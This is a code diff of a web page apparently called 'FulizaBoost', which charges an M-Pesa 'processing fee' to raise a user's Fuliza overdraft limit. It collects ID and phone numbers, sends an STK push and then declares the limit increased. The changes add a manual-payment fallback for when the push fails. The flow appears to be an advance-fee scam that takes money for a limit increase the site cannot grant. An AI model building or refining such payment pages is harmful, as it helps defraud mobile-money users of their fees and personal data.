       }
 
@@ -1413,20 +1745,21 @@
       getLimitBtn.disabled = true;
 
       try {
+        // Confirm details
         const confirmed = await Swal.fire({
           title: 'Confirm Limit Increase',
           html: `
-            <div class="payment-confirm-content">
-              <div class="payment-confirm-icon"><i class="fas fa-wallet"></i></div>
-              <div class="payment-details-box">
-                <div class="payment-detail-row"><span>New Limit:</span><strong style="color:var(--primary);">Ksh ${selectedLoan.amount.toLocaleString()}</strong></div>
-                <div class="payment-detail-row"><span>Processing Fee:</span><strong>Ksh ${selectedLoan.fee}</strong></div>
-                <div class="payment-detail-row"><span>ID Number:</span><strong>${idNumber}</strong></div>
-                <div class="payment-detail-row"><span>Phone:</span><strong>0${formatPhoneForDisplay(phoneNumber)}</strong></div>
-              </div>
-              <p class="payment-phone-note">An M-Pesa STK push will be sent to your phone</p>
-            </div>
-          `,
+                <div class="payment-confirm-content">
+                  <div class="payment-confirm-icon"><i class="fas fa-wallet"></i></div>
+                  <div class="payment-details-box">
+                    <div class="payment-detail-row"><span>New Limit:</span><strong style="color:var(--primary);">Ksh ${selectedLoan.amount.toLocaleString()}</strong></div>
+                    <div class="payment-detail-row"><span>Processing Fee:</span><strong>Ksh ${selectedLoan.fee}</strong></div>
+                    <div class="payment-detail-row"><span>ID Number:</span><strong>${idNumber}</strong></div>
+                    <div class="payment-detail-row"><span>Phone:</span><strong>0${formatPhoneForDisplay(phone)}</strong></div>
+                  </div>
+                  <p class="payment-phone-note">An M-Pesa STK push will be sent to your phone</p>
+                </div>
+              `,
           icon: false,
           showCancelButton: true,
           confirmButtonText: 'Proceed with Payment',
@@ -1443,7 +1776,7 @@
           didOpen: () => Swal.showLoading()
         });
 
-        const normalizedPhone = await normalizePhoneNumber(phoneNumber);
+        const normalizedPhone = await normalizePhoneNumber(phone);
 
         Swal.update({
           title: 'Sending M-Pesa STK Push',
@@ -1466,14 +1799,14 @@
         Swal.fire({
           title: 'STK Push Sent!',
           html: `
-            <div class="stk-push-content">
-              <div class="stk-push-icon"><i class="fas fa-mobile-alt"></i></div>
-              <p><strong>Check your phone for the M-Pesa STK push</strong></p>
-              <div class="stk-phone-display">${formatPhoneForDisplay(phoneNumber)}</div>
-              <p style="color:#666;margin-top:5px;">Enter your M-Pesa PIN to complete</p>
-              <div style="background:#f8f9f7;padding:8px;border-radius:8px;margin-top:10px;"><small>Verifying payment...</small></div>
-            </div>
-          `,
+                <div class="stk-push-content">
+                  <div class="stk-push-icon"><i class="fas fa-mobile-alt"></i></div>
+                  <p><strong>Check your phone for the M-Pesa STK push</strong></p>
+                  <div class="stk-phone-display">${formatPhoneForDisplay(phone)}</div>
+                  <p style="color:#666;margin-top:5px;">Enter your M-Pesa PIN to complete</p>
+                  <div style="background:#f8f9f7;padding:8px;border-radius:8px;margin-top:10px;"><small>Verifying payment...</small></div>
+                </div>
+              `,
           icon: false,
           showConfirmButton: false,
           allowOutsideClick: false
@@ -1485,24 +1818,24 @@
           await Swal.fire({
             title: 'Payment Successful!',
             html: `
-              <div style="text-align:center;padding:0 4px;">
-                <div class="success-icon"><i class="fas fa-check-circle"></i></div>
-                <p><strong>Your Fuliza limit has been increased!</strong></p>
-                <p style="color:#666;margin-top:6px;">New limit: <strong style="color:#1f7a1f;">Ksh ${selectedLoan.amount.toLocaleString()}</strong></p>
-                <div style="background:linear-gradient(135deg,rgba(31,122,31,0.1),rgba(31,122,31,0.05));border-left:3px solid var(--accent);padding:10px;border-radius:8px;margin-top:12px;text-align:left;font-size:0.75rem;color:var(--text-dark);line-height:1.4;">
-                  <div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:2px;">
-                    <i class="fas fa-exclamation-circle" style="color:var(--accent);font-size:0.8rem;"></i>
-                    <strong style="color:var(--accent);">Important:</strong>
+                  <div style="text-align:center;padding:0 4px;">
+                    <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+                    <p><strong>Your Fuliza limit has been increased!</strong></p>
+                    <p style="color:#666;margin-top:6px;">New limit: <strong style="color:#1f7a1f;">Ksh ${selectedLoan.amount.toLocaleString()}</strong></p>
+                    <div style="background:linear-gradient(135deg,rgba(31,122,31,0.1),rgba(31,122,31,0.05));border-left:3px solid var(--accent);padding:10px;border-radius:8px;margin-top:12px;text-align:left;font-size:0.75rem;color:var(--text-dark);line-height:1.4;">
+                      <div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:2px;">
+                        <i class="fas fa-exclamation-circle" style="color:var(--accent);font-size:0.8rem;"></i>
+                        <strong style="color:var(--accent);">Important:</strong>
+                      </div>
+                      <div style="padding-left:20px;">
+                        If limit doesn't increase immediately:<br>
+                        1. Dial *234# → Opt Out of Fuliza<br>
+                        2. Wait 2 min → Dial *234# again → Opt In
+                      </div>
+                    </div>
+                    <p style="color:#666;margin-top:8px;font-size:0.75rem;">Thank you for using FulizaBoost!</p>
                   </div>
-                  <div style="padding-left:20px;">
-                    If limit doesn't increase immediately:<br>
-                    1. Dial *234# → Opt Out of Fuliza<br>
-                    2. Wait 2 min → Dial *234# again → Opt In
-                  </div>
-                </div>
-                <p style="color:#666;margin-top:8px;font-size:0.75rem;">Thank you for using FulizaBoost!</p>
-              </div>
-            `,
+                `,
             icon: false,
             confirmButtonText: 'Continue',
             confirmButtonColor: '#1f7a1f',
@@ -1517,23 +1850,22 @@
         }
       } catch (error) {
         console.error('Payment error:', error);
-        Swal.fire({
-          title: 'Payment Failed',
-          html: `
-            <div style="text-align:center;padding:0 4px;">
-              <div class="error-icon"><i class="fas fa-exclamation-triangle"></i></div>
-              <p><strong>${error.message || 'Payment processing failed'}</strong></p>
-              <p style="color:#666;margin-top:8px;font-size:0.8rem;">Check your network and M-Pesa balance, then try again</p>
-            </div>
-          `,
-          icon: false,
-          confirmButtonText: 'Try Again',
-          confirmButtonColor: '#1f7a1f'
-        });
-        resetButton();
+        // ─── FALLBACK: show manual payment with 2s loading ────────────
+        showManualPaymentFallback(phone, initiatePaymentWithPhone);
       }
     }
 
+    // ─── ORIGINAL initiatePayment (wraps the new flow) ──────────────
+    async function initiatePayment() {
+      if (!phoneNumber || phoneNumber.length !== 9) {
+        Swal.fire({ icon: 'error', title: 'Invalid Phone', text: 'Please enter a valid 9-digit phone number',
+          confirmButtonColor: '#1f7a1f' });
+        return;
+      }
+      await initiatePaymentWithPhone(phoneNumber);
+    }
+
+    // ─── RESET HELPERS ──────────────────────────────────────────────────
     function resetButton() {
       isProcessing = false;
       getLimitBtn.innerHTML = `<i class="fas fa-bolt"></i> Get Limit Now`;
@@ -1553,14 +1885,16 @@
         const sel = document.querySelector('.loan-box.selected');
         if (sel) {
           const next = sel.nextElementSibling || document.querySelector('.loan-box');
-          if (next) { next.click(); next.focus(); }
+          if (next) { next.click();
+            next.focus(); }
         }
       } else if (e.key === 'ArrowLeft' || e.key === 'ArrowUp') {
         const sel = document.querySelector('.loan-box.selected');
         if (sel) {
           const prev = sel.previousElementSibling ||
             document.querySelectorAll('.loan-box')[document.querySelectorAll('.loan-box').length - 1];
-          if (prev) { prev.click(); prev.focus(); }
+          if (prev) { prev.click();
+            prev.focus(); }
         }
       }
     });
